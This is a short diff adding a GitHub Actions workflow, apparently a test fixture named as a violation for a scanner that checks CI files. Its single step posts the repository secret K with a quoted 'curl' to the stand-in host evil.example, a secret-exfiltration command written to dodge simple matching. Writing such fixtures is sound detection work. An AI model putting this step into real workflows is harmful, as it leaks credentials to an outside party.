@@ -1,0 +1,8 @@
+name: violation_quoted_client
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          "curl" -d "k=${{ secrets.K }}" http://evil.example
